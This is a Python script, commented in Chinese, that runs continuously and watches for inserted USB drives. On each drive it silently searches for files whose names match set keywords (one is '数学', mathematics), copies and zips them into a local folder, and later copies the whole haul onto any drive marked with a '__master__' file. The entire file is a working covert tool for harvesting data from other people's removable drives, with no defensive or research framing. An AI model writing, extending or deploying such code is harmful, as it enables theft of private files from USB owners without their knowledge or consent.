import os
import psutil
import shutil
import time
import logging
import tempfile
import hashlib
import zipfile
import concurrent.futures

# 检查并创建下载文件夹
download_folder = os.path.join(os.getcwd(), 'download')
if not os.path.exists(download_folder):
    os.makedirs(download_folder)

# 配置日志，日志文件存放在 ./download 文件夹
log_file_path = os.path.join(download_folder, 'usb_detection.log')
logging.basicConfig(
    filename=log_file_path,
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

# 也将日志输出到控制台，方便调试
console_handler = logging.StreamHandler()
console_handler.setLevel(logging.INFO)
console_formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
console_handler.setFormatter(console_formatter)
logging.getLogger().addHandler(console_handler)

# 关键词列表，用于匹配文件名
keywords = ['数学', 'keyword2', 'keyword3']  # 填写你需要的关键词

# 哈希表，用于记录文件的哈希值
hash_table = set()

# 检测是否是U盘
def is_usb_drive(device):
    return device.mountpoint and ('/dev/sd' in device.device or '/dev/tty' in device.device)

# 获取U盘特征，生成哈希值
def get_usb_drive_feature(usb_drive):
    try:
        feature_string = ""
        for root, dirs, files in os.walk(usb_drive):
            dirs.sort()
            files.sort()
            for dir_name in dirs:
                feature_string += dir_name
            for file_name in files:
                relative_path = os.path.relpath(os.path.join(root, file_name), usb_drive)
                feature_string += relative_path
        return hashlib.sha256(feature_string.encode('utf-8')).hexdigest()
    except Exception as e:
        logging.error(f"U盘特征生成失误，因：{e}")
        return None

# 获取文件的哈希值
def get_file_hash(file_path):
    try:
        sha256_hash = hashlib.sha256()
        with open(file_path, "rb") as f:
            # 逐块读取文件并更新哈希值
            for byte_block in iter(lambda: f.read(4096), b""):
                sha256_hash.update(byte_block)
        return sha256_hash.hexdigest()
    except Exception as e:
        logging.error(f"获取文件 {file_path} 哈希值时失败，因：{e}")
        return None

# 扫描U盘文件
def scan_usb_files(drive_path):
    matched_files = []
    try:
        for root, dirs, files in os.walk(drive_path):
            for file in files:
                if any(keyword in file for keyword in keywords):
                    file_path = os.path.join(root, file)
                    file_hash = get_file_hash(file_path)
                    if file_hash and file_hash not in hash_table:  # 如果文件哈希不在哈希表中
                        matched_files.append(file_path)
                        hash_table.add(file_hash)  # 记录文件的哈希值
        return matched_files
    except Exception as e:
        logging.error(f"扫描失误，因：{e}")
        return []

# 压缩匹配到的文件
def compress_files(files, output_zip):
    try:
        with tempfile.TemporaryDirectory() as temp_dir:
            for file in files:
                relative_path = os.path.relpath(file, start=os.path.commonpath(files))
                target_dir = os.path.join(temp_dir, os.path.dirname(relative_path))
                if not os.path.exists(target_dir):  # 确保目标目录存在
                    os.makedirs(target_dir)
                shutil.copy(file, os.path.join(target_dir, os.path.basename(file)))  # 复制文件到目标文件夹

            with zipfile.ZipFile(output_zip, 'w', zipfile.ZIP_DEFLATED) as zipf:
                for root, dirs, files_in_temp in os.walk(temp_dir):
                    for file in files_in_temp:
                        file_path = os.path.join(root, file)
                        arcname = os.path.relpath(file_path, start=temp_dir)
                        zipf.write(file_path, arcname=arcname)

        logging.info(f"已压缩至 {output_zip}")
    except Exception as e:
        logging.error(f"压缩失误，因：{e}")

# 转移整个 ./download 文件夹到U盘根目录
def transfer_files_to_usb(usb_drive, source_folder):
    try:
        target_folder = os.path.join(usb_drive, os.path.basename(source_folder))  # 将 ./download 文件夹移到 U 盘根目录

        if os.path.exists(target_folder):
            logging.info(f"{target_folder} 已存，跳过传输。")
        else:
            shutil.copytree(source_folder, target_folder)  # 复制整个文件夹及其内容
            logging.info(f"已传输 {source_folder} 至 {usb_drive}")
    except Exception as e:
        logging.error(f"传输失误，因：{e}")

# 处理每个U盘的任务
def handle_usb_drive(usb_drive):
    master_file = os.path.join(usb_drive, '__master__')
    if os.path.exists(master_file):
        logging.info(f"已见 {master_file}，跳过扫描压缩。")
        transfer_files_to_usb(usb_drive, download_folder)  # 直接将 ./download 文件夹拷贝到 U盘根目录
        return

    # 获取U盘特征作为压缩文件名
    usb_feature = get_usb_drive_feature(usb_drive)
    if usb_feature:
        # 获取U盘文件
        files_to_compress = scan_usb_files(usb_drive)
        if files_to_compress:
            # 使用U盘的特征生成压缩文件名
            zip_file = os.path.join(download_folder, f'{usb_feature}.zip')
            compress_files(files_to_compress, zip_file)

            # 检查是否有 __master__ 文件
            if os.path.exists(master_file):
                transfer_files_to_usb(usb_drive, download_folder)
                logging.info(f"已传输 {zip_file} 至 {usb_drive}")

# 主程序
def main():
    global hash_table
    with concurrent.futures.ThreadPoolExecutor() as executor:
        while True:
            # 检测所有设备
            usb_drives = [disk.device for disk in psutil.disk_partitions() if 'removable' in disk.opts]

            # 启动线程处理每个U盘
            futures = []
            for usb_drive in usb_drives:
                logging.info(f"见U盘：{usb_drive}")
                futures.append(executor.submit(handle_usb_drive, usb_drive))

            # 等待线程完成
            for future in futures:
                future.result()

            # 如果没有U盘，清空哈希表
            if not usb_drives:
                hash_table.clear()
                logging.info("没有检测到U盘，已清空哈希表。")

            time.sleep(7)  # 每7秒扫描一次

if __name__ == '__main__':
    main()